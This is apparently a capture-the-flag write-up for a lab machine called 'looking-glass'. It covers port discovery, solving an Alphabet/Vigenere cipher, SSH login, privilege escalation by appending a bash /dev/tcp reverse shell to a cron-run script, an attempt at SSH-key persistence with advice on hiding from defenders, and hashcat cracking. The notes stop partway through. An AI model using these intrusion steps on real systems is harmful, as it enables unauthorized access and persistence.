@@ -1,0 +1,194 @@
+nmap reveal that port 9000 through 13783 is open and is running an SSH server.
+It seems, through me trying it, that ports between those numbers is also running an ssh server.
+
+If we try to ssh into it, we get the response Lower or Higher depending on which port number we choose. The hint is O(log n), which I assume it is a hint to the search algorithm to use. Can't remember
+the name of it, but you start with a min and a max and a middle. If middle==lower, it becomes the new min. If higher it becomes the new max. Continue until you found the port.
+
+Trough this process, we find that if we try to ssh to port 12967 we get an interesting message:
+# ssh -o "StrictHostKeyChecking no" -p 12967 10.10.177.183
+Warning: Permanently added '[10.10.177.183]:12967' (RSA) to the list of known hosts.
+You've found the real service.
+Solve the challenge to get access to the box
+Jabberwocky
+'Mdes mgplmmz, cvs alv lsmtsn aowil
+Fqs ncix hrd rxtbmi bp bwl arul;
+Elw bpmtc pgzt alv uvvordcet,
+Egf bwl qffl vaewz ovxztiql.
+
+'Fvphve ewl Jbfugzlvgb, ff woy!
+Ioe kepu bwhx sbai, tst jlbal vppa grmjl!
+Bplhrf xag Rjinlu imro, pud tlnp
+Bwl jintmofh Iaohxtachxta!'
+
+Oi tzdr hjw oqzehp jpvvd tc oaoh:
+Eqvv amdx ale xpuxpqx hwt oi jhbkhe--
+Hv rfwmgl wl fp moi Tfbaun xkgm,
+Puh jmvsd lloimi bp bwvyxaa.
+
+Eno pz io yyhqho xyhbkhe wl sushf,
+Bwl Nruiirhdjk, xmmj mnlw fy mpaxt,
+Jani pjqumpzgn xhcdbgi xag bjskvr dsoo,
+Pud cykdttk ej ba gaxt!
+
+Vnf, xpq! Wcl, xnh! Hrd ewyovka cvs alihbkh
+Ewl vpvict qseux dine huidoxt-achgb!
+Al peqi pt eitf, ick azmo mtd wlae
+Lx ymca krebqpsxug cevm.
+
+'Ick lrla xhzj zlbmg vpt Qesulvwzrr?
+Cpqx vw bf eifz, qy mthmjwa dwn!
+V jitinofh kaz! Gtntdvl! Ttspaj!'
+Wl ciskvttk me apw jzn.
+
+'Awbw utqasmx, tuh tst zljxaa bdcij
+Wph gjgl aoh zkuqsi zg ale hpie;
+Bpe oqbzc nxyi tst iosszqdtz,
+Eew ale xdte semja dbxxkhfe.
+Jdbr tivtmi pw sxderpIoeKeudmgdstd
+Enter Secret:
+
+From the last room, we can recognize this as the poem "Jabberwocky" but ciphered in some way.
+By doing some reading the last time I did this room, I managed to dig up that the author of Alice in Wonderland (Lewis Carrol), also created
+a Vigenere type-cipher called The Alphabet Cipher https://en.wikipedia.org/wiki/The_Alphabet_Cipher which he was convinced was unbreakable,
+but it was quickly proved wrong.
+
+We can use this site to crack the cipher: https://www.guballa.de/vigenere-solver
+
+Here we find out that it is the poem Jabberwocky, with a line amended at the end.
+"Your secret is bewareTheJabberwock"
+
+When we enter the secret in the ssh-prompt we get:
+jabberwock:StumbledDignifiedTrailingDisrespectful
+
+which looks like credentials.
+
+Now we could try those on port 22.
+
+This lets us in to the server, and we find the flag:
+jabberwock@looking-glass:~$ cat user.txt
+}32a911966cab2d643f5d57d9e0173d56{mht
+
+This looks reversed, so the proper flag is
+jabberwock@looking-glass:~$ cat user.txt | rev
+thm{65d3710e9d75d5f346d2bac669119a23}
+
+Now lets try to get a root shell.
+
+sudo -l doesn't give us much.
+$ sudo -l
+Matching Defaults entries for jabberwock on looking-glass:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jabberwock may run the following commands on looking-glass:
+    (root) NOPASSWD: /sbin/reboot
+
+We can reboot the machine, but that won't do much good.
+
+But crontab looks a lot more fun:
+$ cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+#
+@reboot tweedledum bash /home/jabberwock/twasBrillig.sh
+
+The contents if twasBrillig.sh
+$ cat twasBrillig.sh
+wall $(cat /home/jabberwock/poem.txt)
+
+So it cat:s out the contenxt of poem.txt to every user at boot, like a MOTD.
+We might be able to insert a reverse shell in twasBrillig.sh, so we can get a shell as tweedledum, like so:
+$ cat twasBrillig.sh
+wall $(cat /home/jabberwock/poem.txt)
+bash -i >& /dev/tcp/10.10.156.142/4444 0>&1
+
+After a reboot, bingo!
+# nc -lvnp 4444
+Listening on [0.0.0.0] (family 0, port 4444)
+Connection from 10.10.177.183 34748 received!
+bash: cannot set terminal process group (920): Inappropriate ioctl for device
+bash: no job control in this shell
+tweedledum@looking-glass:~$ id
+id
+uid=1002(tweedledum) gid=1002(tweedledum) groups=1002(tweedledum)
+
+Now lets try to get some persistence so we don't have to work from a reverse shell.
+
+We generate a ssh-key and paste it into /home/tweedledum/.ssh/authorized_keys, that way we can
+log in without knowing the password. If I remember my SSH correctly.
+
+This file doesn't exist, so we have to create it.
+
+We create an ssh key using ssh-keygen:
+# ssh-keygen
+
+and I chose to save it to /root/.ssh/tweedledum
+We then paste the contents of /root/.ssh/tweedledum.pub into /home/tweedledum/.ssh/authorized_keys on the remote machine.
+Preferably change "root@IP" at the end of the key so we don't give away our identity to the blue team.
+
+Unfortunately that didn't work, I need to read up on why.
+The current permissions on .ssh on the target:
+drwxrwxr-x 2 tweedledum tweedledum 4096 Aug 13 21:35 .ssh
+-rw-rw-r-- 1 tweedledum tweedledum  397 Aug 13 21:35 authorized_keys
+
+Changing them to 700 for .ssh/ and 600 for authorized_keys doesn't seem to work either.
+
+/etc/ssh/sshd_config holds the answer. It looks like no user can log in remotely, except jabberwock (and perhaps alice)
+Match User tweedledee
+        PubkeyAuthentication no
+        PasswordAuthentication no
+Match User tweedledum
+        PubkeyAuthentication no
+        PasswordAuthentication no
+Match User humptydumpty
+        PubkeyAuthentication no
+        PasswordAuthentication no
+Match User jabberwock
+        PubkeyAuthentication no
+
+
+So we'll just work from the reverse shell for now.
+
+I'm not great at reading this output. Does this mean that tweedledee can run /bin/bash
+as sudo without as password? Or does it just mean that tweedledum can run /bin/bash without a password?
+tweedledum@looking-glass:~$ sudo -l
+sudo -l
+Matching Defaults entries for tweedledum on looking-glass:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User tweedle may run the following commands on looking-glass:
+    (tweedledee) NOPASSWD: /bin/bash
+
+This means that I want to side-escalate (is that a word?) to tweedledee.
+
+In the /home/tweedledum we see a humptydumpty.txt:
+tweedledum@looking-glass:~$ cat humptydumpty.txt
+dcfff5eb40423f055a4cd0a8d7ed39ff6cb9816868f5766b4088b9e9906961b9
+7692c3ad3540bb803c020b3aee66cd8887123234ea0c6e7143c0add73ff431ed
+28391d3bc64ec15cbb090426b04aa6b7649c3cc85f11230bb0105e02d15e3624
+b808e156d18d1cecdcc1456375f8cae994c36549a07c8c2315b473dd9d7f404f
+fa51fd49abf67705d6a35d18218c115ff5633aec1f9ebfdc9d5d4956416f57f6
+b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
+5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8
+7468652070617373776f7264206973207a797877767574737271706f6e6d6c6b
+
+These look like hashes. They are 64 characters long, so I assume they are sha256 hashes.
+Lets see if we can crack them using hashcat:
+# hashcat -m 1400 -o outfile.txt humptydumpty.txt /usr/share/wordlists/rockyou.txt
+# hashcat -m 1400 -o outfile.txt humptydumpty.txt /usr/share/wordlists/fasttrack.txt
+
+fasttrack.txt and rockyou.txt seems to crack different hashes, and only 3-4 of them.
+
+I've saved the ones I cracked with hashcat, and googled, in list.txt
